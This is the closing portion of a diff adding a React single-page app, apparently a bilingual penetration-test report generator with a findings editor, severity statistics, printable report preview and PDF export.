+                setActiveTab('preview');
+                requestAnimationFrame(() => {
+                    requestAnimationFrame(() => {
+                        setTimeout(() => window.print(), 800);
+                    });
+                });
+            };
+
+            // --- ESTADÍSTICAS CALCULADAS ---
+            const stats = useMemo(() => {
+                const counts = { crit: 0, high: 0, med: 0, low: 0, info: 0 };
+                findings.forEach(f => { if(counts[f.severity] !== undefined) counts[f.severity]++; });
+                
+                let globalRiskKey = "info";
+                if (counts.crit > 0) globalRiskKey = "crit";
+                else if (counts.high > 0) globalRiskKey = "high";
+                else if (counts.med > 0) globalRiskKey = "med";
+                else if (counts.low > 0) globalRiskKey = "low";
+
+                return { counts, total: findings.length, globalRiskKey };
+            }, [findings]);
+
+            const getSeverityStyles = (sevKey) => {
+                switch(sevKey) {
+                    case 'crit': return { bg: 'bg-severity-crit', text: 'text-white', lightBg: 'bg-red-50', border: 'border-severity-crit', textDark: 'text-severity-crit' };
+                    case 'high': return { bg: 'bg-severity-high', text: 'text-white', lightBg: 'bg-orange-50', border: 'border-severity-high', textDark: 'text-severity-high' };
+                    case 'med': return { bg: 'bg-severity-med', text: 'text-black', lightBg: 'bg-yellow-50', border: 'border-severity-med', textDark: 'text-yellow-600' };
+                    case 'low': return { bg: 'bg-severity-low', text: 'text-white', lightBg: 'bg-blue-50', border: 'border-severity-low', textDark: 'text-severity-low' };
+                    case 'info': return { bg: 'bg-severity-info', text: 'text-white', lightBg: 'bg-gray-50', border: 'border-severity-info', textDark: 'text-severity-info' };
+                    default: return { bg: 'bg-gray-200', text: 'text-gray-800', lightBg: 'bg-gray-50', border: 'border-gray-200', textDark: 'text-gray-800' };
+                }
+            };
+
+            // --- VISTA: EDITOR ---
+            const renderEditor = () => (
+                <div className="flex flex-col lg:flex-row gap-8 max-w-7xl mx-auto">
+                    {/* COLUMNA IZQUIERDA: Nuevo Hallazgo */}
+                    <div className="w-full lg:w-1/2">
+                        <div className="bg-white p-8 rounded-xl shadow-sm border border-gray-100">
+                            <div className="flex items-center mb-2">
+                                <Icons.Target />
+                                <h2 className="text-xl font-bold ml-2 text-gray-900">{t.newFinding}</h2>
+                            </div>
+                            <p className="text-gray-500 mb-8 text-sm">{t.newFindingDesc}</p>
+
+                            <form onSubmit={addFinding} className="space-y-6">
+                                <div className="bg-indigo-50/50 p-5 rounded-lg border border-indigo-100/50">
+                                    <label className="block text-xs font-bold text-brand-900 uppercase tracking-wider mb-2">{t.quickTemplate}</label>
+                                    <select 
+                                        name="templateKey" 
+                                        value={currentFinding.templateKey} 
+                                        onChange={handleTemplateChange}
+                                        className="w-full p-2.5 bg-white border border-gray-200 rounded-md shadow-sm focus:ring-2 focus:ring-brand-500 focus:border-brand-500 outline-none transition-all text-sm font-medium text-gray-700 cursor-pointer"
+                                    >
+                                        <option value="custom">{t.customOther}</option>
+                                        {Object.values(templates).sort((a,b) => a[lang].title.localeCompare(b[lang].title)).map(tpl => (
+                                            <option key={tpl.key} value={tpl.key}>{tpl[lang].title}</option>
+                                        ))}
+                                    </select>
+                                </div>
+
+                                <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
+                                    <div className="md:col-span-2">
+                                        <label className="block text-xs font-bold text-gray-700 mb-1">{t.specTitle}</label>
+                                        <input required type="text" name="title" value={currentFinding.title} onChange={handleFindingChange} className="w-full p-2.5 border border-gray-200 rounded-md shadow-sm focus:ring-2 focus:ring-brand-500 outline-none text-sm" />
+                                    </div>
+                                    <div>
+                                        <label className="block text-xs font-bold text-gray-700 mb-1">{t.severity}</label>
+                                        <select name="severity" value={currentFinding.severity} onChange={handleFindingChange} className={`w-full p-2.5 border border-gray-200 rounded-md shadow-sm focus:ring-2 focus:ring-brand-500 outline-none font-semibold text-sm ${getSeverityStyles(currentFinding.severity).textDark} ${getSeverityStyles(currentFinding.severity).lightBg}`}>
+                                            {Object.keys(severities).map(k => (
+                                                <option key={k} value={k}>{severities[k][lang]}</option>
+                                            ))}
+                                        </select>
+                                    </div>
+                                </div>
+
+                                <div className="grid grid-cols-1 md:grid-cols-4 gap-5">
+                                    <div className="md:col-span-3">
+                                        <label className="block text-xs font-bold text-gray-700 mb-1">{t.techDesc}</label>
+                                        <textarea required name="description" value={currentFinding.description} onChange={handleFindingChange} rows="3" className="w-full p-2.5 border border-gray-200 rounded-md shadow-sm focus:ring-2 focus:ring-brand-500 outline-none text-sm resize-none"></textarea>
+                                    </div>
+                                    <div className="md:col-span-1">
+                                        <label className="block text-xs font-bold text-gray-700 mb-1">{t.cvss}</label>
+                                        <input type="text" name="cvss" value={currentFinding.cvss} onChange={handleFindingChange} className="w-full p-2.5 border border-gray-200 rounded-md shadow-sm focus:ring-2 focus:ring-brand-500 outline-none text-center font-mono text-sm bg-gray-50" placeholder="9.8" />
+                                    </div>
+                                </div>
+
+                                <div>
+                                    <label className="block text-xs font-bold text-gray-700 mb-1 flex items-center">
+                                        <Icons.Code /> {t.poc}
+                                    </label>
+                                    <textarea name="poc" value={currentFinding.poc} onChange={handleFindingChange} rows="4" className="w-full p-3 bg-gray-900 text-green-400 border border-gray-800 rounded-md shadow-inner font-mono text-xs focus:ring-2 focus:ring-brand-500 outline-none resize-none leading-relaxed"></textarea>
+                                </div>
+
+                                <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+                                    <div>
+                                        <label className="block text-xs font-bold text-gray-700 mb-1">{t.impact}</label>
+                                        <textarea name="impact" value={currentFinding.impact} onChange={handleFindingChange} rows="3" className="w-full p-2.5 border border-gray-200 rounded-md shadow-sm focus:ring-2 focus:ring-brand-500 outline-none text-sm resize-none"></textarea>
+                                    </div>
+                                    <div>
+                                        <label className="block text-xs font-bold text-gray-700 mb-1">{t.remediation}</label>
+                                        <textarea name="remediation" value={currentFinding.remediation} onChange={handleFindingChange} rows="3" className="w-full p-2.5 border border-gray-200 rounded-md shadow-sm focus:ring-2 focus:ring-brand-500 outline-none text-sm resize-none"></textarea>
+                                    </div>
+                                </div>
+
+                                <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+                                    <div>
+                                        <label className="block text-xs font-bold text-gray-700 mb-1">{t.reference}</label>
+                                        <input type="text" name="reference" value={currentFinding.reference} onChange={handleFindingChange} className="w-full p-2.5 border border-gray-200 rounded-md shadow-sm focus:ring-2 focus:ring-brand-500 outline-none text-sm" />
+                                    </div>
+                                    <div>
+                                        <label className="block text-xs font-bold text-gray-700 mb-1">{t.cve}</label>
+                                        <input type="text" name="cve" value={currentFinding.cve} onChange={handleFindingChange} className="w-full p-2.5 border border-gray-200 rounded-md shadow-sm focus:ring-2 focus:ring-brand-500 outline-none text-sm" placeholder="CVE-XXXX-XXXX" />
+                                    </div>
+                                </div>
+
+                                <div className="border border-dashed border-gray-300 p-5 rounded-lg bg-gray-50/50 hover:bg-gray-50 transition-colors">
+                                    <div className="flex justify-between items-center mb-3">
+                                        <label className="text-xs font-bold text-gray-700 flex items-center">
+                                            <svg className="w-4 h-4 mr-1 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                                            {t.images}
+                                        </label>
+                                        <label className="cursor-pointer bg-white border border-gray-300 text-gray-700 px-3 py-1.5 rounded text-xs font-medium hover:bg-gray-50 transition-colors shadow-sm">
+                                            <input type="file" multiple accept="image/*" onChange={handleImageUpload} className="hidden" />
+                                            {t.uploadImage}
+                                        </label>
+                                    </div>
+                                    
+                                    {currentFinding.images.length > 0 ? (
+                                        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mt-3">
+                                            {currentFinding.images.map((imgSrc, index) => (
+                                                <div key={index} className="relative group rounded-md overflow-hidden border border-gray-200 shadow-sm">
+                                                    <img src={imgSrc} alt="Evidencia" className="h-20 w-full object-cover" />
+                                                    <button type="button" onClick={() => removeImage(index)} className="absolute top-1 right-1 bg-red-600/90 text-white rounded-full p-1 opacity-0 group-hover:opacity-100 transition-opacity">
+                                                        <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                                                    </button>
+                                                </div>
+                                            ))}
+                                        </div>
+                                    ) : (
+                                        <div className="text-center py-4 border-2 border-dashed border-gray-200 rounded-md">
+                                            <p className="text-xs text-gray-400">{t.noImages}</p>
+                                        </div>
+                                    )}
+                                </div>
+
+                                <button type="submit" className="w-full bg-brand-950 hover:bg-black text-white font-semibold py-3.5 px-4 rounded-lg shadow-md transition-colors flex justify-center items-center">
+                                    <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path></svg>
+                                    {t.registerBtn}
+                                </button>
+                            </form>
+                        </div>
+                    </div>
+
+                    {/* COLUMNA DERECHA: Datos & Lista */}
+                    <div className="w-full lg:w-1/2 space-y-8">
+                        <div className="bg-white p-8 rounded-xl shadow-sm border border-gray-100">
+                            <h2 className="text-lg font-bold mb-6 flex items-center text-brand-900">
+                                <svg className="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
+                                {t.auditData}
+                            </h2>
+                            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-sm">
+                                <div className="md:col-span-2">
+                                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-wide mb-1">{t.docTitle}</label>
+                                    <input type="text" name="documentTitle" value={auditData.documentTitle} onChange={handleAuditChange} className="w-full p-2.5 border border-gray-200 rounded-md focus:ring-2 focus:ring-brand-500 outline-none bg-gray-50/50" />
+                                </div>
+                                <div>
+                                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-wide mb-1">{t.clientComp}</label>
+                                    <input type="text" name="clientCompany" value={auditData.clientCompany} onChange={handleAuditChange} className="w-full p-2.5 border border-gray-200 rounded-md focus:ring-2 focus:ring-brand-500 outline-none bg-gray-50/50" />
+                                </div>
+                                <div>
+                                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-wide mb-1">{t.targetAsset}</label>
+                                    <input type="text" name="targetAsset" value={auditData.targetAsset} onChange={handleAuditChange} className="w-full p-2.5 border border-gray-200 rounded-md focus:ring-2 focus:ring-brand-500 outline-none bg-gray-50/50" />
+                                </div>
+                                <div>
+                                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-wide mb-1">{t.auditComp}</label>
+                                    <input type="text" name="auditorCompany" value={auditData.auditorCompany} onChange={handleAuditChange} className="w-full p-2.5 border border-gray-200 rounded-md focus:ring-2 focus:ring-brand-500 outline-none bg-gray-50/50" />
+                                </div>
+                                <div>
+                                    <label className="block text-xs font-bold text-gray-500 uppercase tracking-wide mb-1">{t.auditorName}</label>
+                                    <input type="text" name="auditorName" value={auditData.auditorName} onChange={handleAuditChange} className="w-full p-2.5 border border-gray-200 rounded-md focus:ring-2 focus:ring-brand-500 outline-none bg-gray-50/50" />
+                                </div>
+                                <div className="md:col-span-2 grid grid-cols-3 gap-5 border-t border-gray-100 pt-5 mt-2">
+                                    <div>
+                                        <label className="block text-xs font-bold text-gray-500 uppercase tracking-wide mb-1">{t.classification}</label>
+                                        <select name="classification" value={auditData.classification} onChange={handleAuditChange} className="w-full p-2.5 border border-gray-200 rounded-md focus:ring-2 focus:ring-brand-500 outline-none bg-white">
+                                            {t.classifications.map((c, idx) => (
+                                                <option key={idx} value={idx}>{c}</option>
+                                            ))}
+                                        </select>
+                                    </div>
+                                    <div>
+                                        <label className="block text-xs font-bold text-gray-500 uppercase tracking-wide mb-1">{t.version}</label>
+                                        <input type="text" name="version" value={auditData.version} onChange={handleAuditChange} className="w-full p-2.5 border border-gray-200 rounded-md focus:ring-2 focus:ring-brand-500 outline-none text-center bg-white" />
+                                    </div>
+                                    <div>
+                                        <label className="block text-xs font-bold text-gray-500 uppercase tracking-wide mb-1">{t.date}</label>
+                                        <input type="date" name="date" value={auditData.date} onChange={handleAuditChange} className="w-full p-2.5 border border-gray-200 rounded-md focus:ring-2 focus:ring-brand-500 outline-none bg-white" />
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div className="bg-white p-8 rounded-xl shadow-sm border border-gray-100">
+                            <div className="flex items-center justify-between mb-6 pb-4 border-b border-gray-100">
+                                <h2 className="text-lg font-bold text-gray-900">{t.addedFindings}</h2>
+                                <span className="bg-brand-100 text-brand-900 text-xs font-bold px-3 py-1 rounded-full">{stats.total} {t.findingsCount}</span>
+                            </div>
+                            
+                            <div className="space-y-4 max-h-[600px] overflow-y-auto pr-2">
+                                {findings.length === 0 ? (
+                                    <div className="text-center py-10 bg-gray-50 rounded-lg border border-dashed border-gray-200">
+                                        <p className="text-sm text-gray-500">{t.noFindings}</p>
+                                    </div>
+                                ) : (
+                                    findings.map((f, index) => {
+                                        const styles = getSeverityStyles(f.severity);
+                                        return (
+                                            <div key={f.id} className="bg-white border border-gray-200 rounded-lg p-4 relative group hover:border-brand-300 hover:shadow-md transition-all">
+                                                <button onClick={() => removeFinding(f.id)} className="absolute top-4 right-4 text-gray-400 hover:text-red-500 opacity-0 group-hover:opacity-100 transition-opacity bg-white" title="Remove">
+                                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg>
+                                                </button>
+                                                
+                                                <div className="flex items-start gap-3 mb-2 pr-8">
+                                                    <span className={`mt-0.5 text-xs font-bold px-2.5 py-0.5 rounded uppercase tracking-wider ${styles.bg} ${styles.text}`}>
+                                                        {severities[f.severity][lang]}
+                                                    </span>
+                                                    <h3 className="font-bold text-gray-900 leading-tight">{f.title}</h3>
+                                                </div>
+                                                <p className="text-sm text-gray-500 line-clamp-2 leading-relaxed">{f.description}</p>
+                                            </div>
+                                        )
+                                    })
+                                )}
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            );
+
+            // --- VISTA: PREVIEW DEL REPORTE ---
+            const renderPreview = () => (
+                <div className="preview-container bg-white mx-auto paper-shadow text-gray-800" style={{ width: '210mm', minHeight: '297mm' }}>
+                    
+                    {/* PORTADA */}
+                    <div className="h-[297mm] p-[20mm] flex flex-col relative page-break">
+                        <div className="mt-20 mb-12 text-brand-900">
+                            <Icons.Shield />
+                        </div>
+
+                        <div className="flex-grow">
+                            <h1 className="text-5xl font-black mb-6 text-brand-950 leading-tight tracking-tight">
+                                {auditData.documentTitle}
+                            </h1>
+                            <div className="w-24 h-1.5 bg-brand-600 mb-16 print-bg-dark"></div>
+
+                            <div className="grid grid-cols-2 gap-x-12 gap-y-12">
+                                <div>
+                                    <p className="text-xs font-bold text-gray-400 uppercase tracking-widest mb-1">{t.prepFor}</p>
+                                    <p className="text-xl font-bold text-gray-900">{auditData.clientCompany}</p>
+                                    <p className="text-sm text-gray-600 mt-1">{auditData.targetAsset}</p>
+                                </div>
+                                <div>
+                                    <p className="text-xs font-bold text-gray-400 uppercase tracking-widest mb-1">{t.prepBy}</p>
+                                    <p className="text-xl font-bold text-gray-900">{auditData.auditorCompany}</p>
+                                    <p className="text-sm text-gray-600 mt-1">{auditData.auditorName}</p>
+                                </div>
+                                <div>
+                                    <p className="text-xs font-bold text-gray-400 uppercase tracking-widest mb-1">{t.date}</p>
+                                    <p className="text-lg font-semibold text-gray-800">{auditData.date}</p>
+                                </div>
+                                <div>
+                                    <p className="text-xs font-bold text-gray-400 uppercase tracking-widest mb-1">{t.version}</p>
+                                    <p className="text-lg font-semibold text-gray-800">v{auditData.version}</p>
+                                </div>
+                                <div className="col-span-2 pt-4 border-t border-gray-200">
+                                    <p className="text-xs font-bold text-gray-400 uppercase tracking-widest mb-1">{t.globalRisk}</p>
+                                    <p className={`text-2xl font-black uppercase ${getSeverityStyles(stats.globalRiskKey).textDark}`}>{severities[stats.globalRiskKey][lang]}</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div className="mt-auto border-t-2 border-brand-900 pt-4 pb-2 print-border">
+                            <p className="text-xs text-gray-400 text-center uppercase tracking-widest">{t.genBy}</p>
+                        </div>
+                    </div>
+
+                    {/* RESUMEN EJECUTIVO */}
+                    <div className="h-[297mm] p-[20mm] flex flex-col relative page-break">
+                        <h2 className="text-3xl font-black text-brand-950 mb-4 tracking-tight">{t.execSummary}</h2>
+                        <div className="w-full h-px bg-gray-200 mb-8 print-bg-gray"></div>
+
+                        <p className="text-gray-700 text-base leading-relaxed mb-8 text-justify">
+                            {t.summaryText1} <strong className="text-gray-900">{auditData.clientCompany}</strong>{t.summaryText2} <strong className="text-gray-900">{stats.total}</strong> {t.summaryText3} <strong className="text-gray-900">{auditData.targetAsset}</strong>{t.summaryText4} <strong className={`uppercase ${getSeverityStyles(stats.globalRiskKey).textDark}`}>{severities[stats.globalRiskKey][lang]}</strong>{t.summaryText5}
+                        </p>
+
+                        <div className="flex gap-4 mb-10">
+                            {['crit', 'high', 'med', 'low', 'info'].map(sev => {
+                                const styles = getSeverityStyles(sev);
+                                return (
+                                    <div key={sev} className={`flex-1 border rounded-xl p-4 text-center bg-white shadow-sm flex flex-col items-center justify-center ${styles.border} print-border`}>
+                                        <span className={`text-4xl font-black mb-1 ${styles.textDark}`}>{stats.counts[sev]}</span>
+                                        <span className="text-[10px] font-bold text-gray-500 uppercase tracking-wider">{severities[sev][lang]}</span>
+                                    </div>
+                                );
+                            })}
+                        </div>
+
+                        <div className="bg-gray-50 rounded-xl p-8 border border-gray-100 print-bg-gray print-border">
+                            <h3 className="text-xs font-bold text-brand-900 uppercase tracking-widest mb-6">{t.distTitle}</h3>
+                            <div className="space-y-4">
+                                {['crit', 'high', 'med', 'low', 'info'].map(sev => {
+                                    const count = stats.counts[sev];
+                                    const percentage = stats.total > 0 ? (count / stats.total) * 100 : 0;
+                                    const styles = getSeverityStyles(sev);
+                                    return (
+                                        <div key={sev} className="flex items-center text-sm">
+                                            <span className="w-24 font-semibold text-gray-700">{severities[sev][lang]}</span>
+                                            <div className="flex-grow h-2.5 bg-gray-200 rounded-full overflow-hidden mr-4 print-bg-gray">
+                                                <div className={`h-full rounded-full ${styles.bg}`} style={{ width: `${percentage}%` }}></div>
+                                            </div>
+                                            <span className="w-8 text-right font-bold text-gray-900">{count}</span>
+                                        </div>
+                                    );
+                                })}
+                            </div>
+                        </div>
+                    </div>
+
+                    {/* DETALLE TÉCNICO */}
+                    <div className="p-[20mm] pt-10 page-break">
+                        <h2 className="text-3xl font-black text-brand-950 mb-4 tracking-tight">{t.techDetails}</h2>
+                        <div className="w-full h-px bg-gray-200 mb-12 print-bg-gray"></div>
+
+                        {findings.length === 0 ? (
+                            <p className="italic text-gray-500">{t.noFindingsPrint}</p>
+                        ) : (
+                            findings.map((f, i) => {
+                                const styles = getSeverityStyles(f.severity);
+                                return (
+                                    <div key={f.id} className="mb-12 border border-gray-200 rounded-xl bg-white shadow-sm overflow-hidden avoid-break print-border">
+                                        <div className="p-6 border-b border-gray-100 relative">
+                                            <div className="flex justify-between items-start mb-4">
+                                                <div className="flex items-center gap-3 pr-24">
+                                                    <span className="text-2xl font-black text-brand-600">#{i+1}</span>
+                                                    <h3 className="text-xl font-bold text-gray-900 leading-tight">{f.title}</h3>
+                                                </div>
+                                                <div className={`absolute top-6 right-6 px-4 py-1.5 rounded-md font-bold text-xs uppercase tracking-wider ${styles.bg} ${styles.text} print-bg-dark`}>
+                                                    {severities[f.severity][lang]}
+                                                </div>
+                                            </div>
+                                            
+                                            <div className="flex flex-wrap gap-2 mt-2">
+                                                {f.cvss && (
+                                                    <span className="inline-flex items-center px-2.5 py-1 rounded border border-gray-200 text-xs font-medium text-gray-600 bg-gray-50 print-border">
+                                                        <Icons.Activity /> CVSS: {f.cvss}
+                                                    </span>
+                                                )}
+                                                {(f.reference || f.cve) && (
+                                                    <span className="inline-flex items-center px-2.5 py-1 rounded border border-gray-200 text-xs font-medium text-gray-600 bg-gray-50 print-border">
+                                                        <Icons.Book /> {f.reference} {f.cve ? `/ ${f.cve}` : ''}
+                                                    </span>
+                                                )}
+                                            </div>
+                                        </div>
+                                        
+                                        <div className="p-6 space-y-8">
+                                            <div>
+                                                <h4 className="flex items-center text-xs font-bold text-gray-400 uppercase tracking-widest mb-3">
+                                                    <Icons.Alert /> {t.techDesc}
+                                                </h4>
+                                                <p className="text-gray-700 text-sm leading-relaxed text-justify whitespace-pre-wrap">{f.description}</p>
+                                            </div>
+
+                                            {f.poc && (
+                                                <div>
+                                                    <h4 className="flex items-center text-xs font-bold text-gray-400 uppercase tracking-widest mb-3">
+                                                        <Icons.Code /> {t.poc}
+                                                    </h4>
+                                                    <div className="bg-brand-950 rounded-lg p-5 print-bg-dark">
+                                                        <pre className="font-mono text-sm text-green-400 whitespace-pre-wrap leading-relaxed">{f.poc}</pre>
+                                                    </div>
+                                                </div>
+                                            )}
+
+                                            {f.images && f.images.length > 0 && (
+                                                <div>
+                                                    <h4 className="flex items-center text-xs font-bold text-gray-400 uppercase tracking-widest mb-3">
+                                                        <Icons.Target /> {t.images}
+                                                    </h4>
+                                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                                        {f.images.map((img, idx) => (
+                                                            <div key={idx} className="border border-gray-200 p-2 rounded-lg print-border">
+                                                                <img src={img} className="max-w-full h-auto object-contain rounded" alt={`Evidencia ${idx+1}`} />
+                                                            </div>
+                                                        ))}
+                                                    </div>
+                                                </div>
+                                            )}
+
+                                            {f.impact && (
+                                                <div>
+                                                    <h4 className="flex items-center text-xs font-bold text-gray-400 uppercase tracking-widest mb-3">
+                                                        <Icons.Alert /> {t.impact}
+                                                    </h4>
+                                                    <div className="border-l-4 border-severity-crit bg-red-50/50 p-4 rounded-r-lg text-sm text-gray-800 leading-relaxed print-bg-gray print-border">
+                                                        <p className="whitespace-pre-wrap">{f.impact}</p>
+                                                    </div>
+                                                </div>
+                                            )}
+
+                                            {f.remediation && (
+                                                <div>
+                                                    <h4 className="flex items-center text-xs font-bold text-gray-400 uppercase tracking-widest mb-3">
+                                                        <Icons.Check /> {t.remediation}
+                                                    </h4>
+                                                    <div className="border-l-4 border-green-500 bg-green-50/50 p-4 rounded-r-lg text-sm text-gray-800 leading-relaxed print-bg-gray print-border">
+                                                        <p className="whitespace-pre-wrap">{f.remediation}</p>
+                                                    </div>
+                                                </div>
+                                            )}
+                                        </div>
+                                    </div>
+                                )
+                            })
+                        )}
+                        
+                        <div className="mt-20 pt-4 border-t border-gray-200 flex justify-between text-[10px] text-gray-400 uppercase tracking-widest print-border">
+                            <div>{t.classifications[auditData.classification]} • {t.prepFor} {auditData.clientCompany}<br/>{t.genBy}</div>
+                            <div className="text-right">{t.reportVer} {auditData.version}<br/>{auditData.date}</div>
+                        </div>
+                    </div>
+
+                </div>
+            );
+
+            return (
+                <div className="min-h-screen flex flex-col font-sans">
+                    {/* TOP NAVBAR */}
+                    <header className="bg-brand-950 text-white shadow-md no-print sticky top-0 z-50">
+                        <div className="max-w-screen-2xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex justify-between items-center">
+                            <div className="flex items-center space-x-3">
+                                <div className="text-brand-500"><Icons.Shield /></div>
+                                <h1 className="text-xl font-bold tracking-tight">{t.appTitle}</h1>
+                            </div>
+                            
+                            <div className="flex items-center space-x-2 sm:space-x-4">
+                                {/* LANGUAGE TOGGLE */}
+                                <button 
+                                    onClick={toggleLanguage}
+                                    className="px-3 py-1.5 rounded-full border border-gray-700 bg-gray-800 hover:bg-gray-700 font-bold text-xs flex items-center transition-colors mr-2"
+                                >
+                                    <Icons.Globe />
+                                    {lang === 'es' ? '🇪🇸 ES' : '🇬🇧 EN'}
+                                </button>
+
+                                <button 
+                                    onClick={() => setActiveTab('editor')}
+                                    className={`px-3 py-2 sm:px-4 rounded-md font-semibold text-xs sm:text-sm transition-all ${activeTab === 'editor' ? 'bg-brand-600 text-white shadow' : 'text-gray-300 hover:text-white hover:bg-white/10'}`}
+                                >
+                                    {t.editPanel}
+                                </button>
+                                <button 
+                                    onClick={() => setActiveTab('preview')}
+                                    className={`px-3 py-2 sm:px-4 rounded-md font-semibold text-xs sm:text-sm transition-all ${activeTab === 'preview' ? 'bg-brand-600 text-white shadow' : 'text-gray-300 hover:text-white hover:bg-white/10'}`}
+                                >
+                                    {t.preview}
+                                </button>
+                                <div className="w-px h-6 bg-gray-700 mx-1"></div>
+                                <button 
+                                    onClick={triggerPrint}
+                                    className="px-3 py-2 sm:px-5 bg-emerald-500 hover:bg-emerald-400 text-white rounded-md font-bold text-xs sm:text-sm flex items-center shadow-md transition-colors"
+                                >
+                                    {t.generatePdf}
+                                </button>
+                            </div>
+                        </div>
+                    </header>
+
+                    {/* MAIN CONTENT */}
+                    <main className="flex-grow p-4 md:p-8 overflow-x-hidden">
+                        <div className={activeTab === 'editor' ? 'block no-print' : 'hidden'}>
+                            {renderEditor()}
+                        </div>
+                        <div className={activeTab === 'preview' ? 'block py-8 bg-gray-200' : 'hidden print-only'}>
+                            {renderPreview()}
+                        </div>
+                    </main>
+                </div>
+            );
+        };
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
+</body>
+</html>
